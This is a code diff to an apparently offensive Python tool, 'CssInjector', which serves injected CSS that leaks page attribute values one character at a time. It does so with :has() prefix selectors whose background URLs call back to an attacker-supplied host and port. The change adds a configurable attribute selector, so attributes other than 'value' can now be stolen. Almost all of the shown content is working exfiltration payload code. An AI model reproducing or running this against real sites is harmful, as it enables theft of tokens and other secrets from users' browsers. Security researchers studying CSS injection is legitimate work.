@@ -37,19 +37,25 @@ class CssInjector:
             "-H", "--hostname", required=True, help="Attacker hostname or IP address"
         )
         parser.add_argument(
-            "-d",
-            "--details",
-            action="store_true",
-            help="Show detailed logs of the exfiltration process, including extracted data.",
-        )
-        parser.add_argument(
             "-p", "--port", required=True, type=int, help="Port number of attacker"
         )
         parser.add_argument(
             "-i",
             "--identifier",
             required=True,
-            help="CSS identifier (CSS selector) to extract specific data",
+            help="CSS identifier to extract specific data",
+        )
+        parser.add_argument(
+            "-s",
+            "--selector",
+            help="Specify a CSS Attribute Selector for exfiltration",
+            default="value",
+        )
+        parser.add_argument(
+            "-d",
+            "--details",
+            action="store_true",
+            help="Show detailed logs of the exfiltration process, including extracted data.",
         )
         return parser
 
@@ -58,11 +64,11 @@ class CssInjector:
             "\33[1m  _____   _____   _____  _____  _   _       _     _____  __     __\n / ____| / ____| / ____||_   _|| \\ | |     | |   |  __ \\ \\ \\   / /\n| |     | (___  | (___    | |  |  \\| |     | |   | |__) | \\ \\_/ /\n| |      \\___ \\  \\___ \\   | |  | . ` | _   | |   |  ___/   \\   /\n| |____  ____) | ____) | _| |_ | |\\  || |__| | _ | |        | |\n \\_____||_____/ |_____/ |_____||_| \\_| \\____/ (_)|_|        |_|\033[0m\n"
         )
         args = self.parser.parse_args()
-
         self.identifier = args.identifier
         self.hostname = args.hostname
         self.port = args.port
         self.show_details = args.details
+        self.selector = args.selector
         self.app = web.Application()
         self.app.middlewares.append(self.dynamic_router_middleware)
         web.run_app(
@@ -76,8 +82,8 @@ class CssInjector:
     def generate_injection(self):
         self.counter_req += 1
         stri = f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}');\n"
-        stri += f'html:has({self.identifier}[value={repr(self.data)}]{"".join([f":not({self.identifier}[value={repr(element)}])" for element in self.elements])}){"".join([":first-child" for i in range(self.counter_req)])}{{background: url("//{self.hostname}:{self.port}/end?num={random.random()}") !important;}}'
-        stri += f"""{"".join(map(lambda x: f'html:has({self.identifier}[value^={repr(self.data+x)}]{"".join([f":not({self.identifier}[value={repr(element)}])" for element in self.elements])}){"".join([":first-child" for i in range(self.counter_req)])}{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.data+x)}") !important;}}\n', "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"))}"""
+        stri += f'html:has({self.identifier}[{self.selector}={repr(self.data)}]{"".join([f":not({self.identifier}[{self.selector}={repr(element)}])" for element in self.elements])}){"".join([":first-child" for i in range(self.counter_req)])}{{background: url("//{self.hostname}:{self.port}/end?num={random.random()}") !important;}}'
+        stri += f"""{"".join(map(lambda x: f'html:has({self.identifier}[{self.selector}^={repr(self.data+x)}]{"".join([f":not({self.identifier}[{self.selector}={repr(element)}])" for element in self.elements])}){"".join([":first-child" for i in range(self.counter_req)])}{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.data+x)}") !important;}}\n', "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "))}"""
         return stri
 
     async def handle_start(self, request):
@@ -91,7 +97,7 @@ class CssInjector:
     async def handle_end(self, request):
         self.log(
             "end_exfiltration",
-            f"The value exfiltrated from {self.identifier} is : {self.data}",
+            f"The {self.selector} exfiltrated from {self.identifier} is : {self.data}",
         )
         self.elements.append(self.data)
         self.data = ""
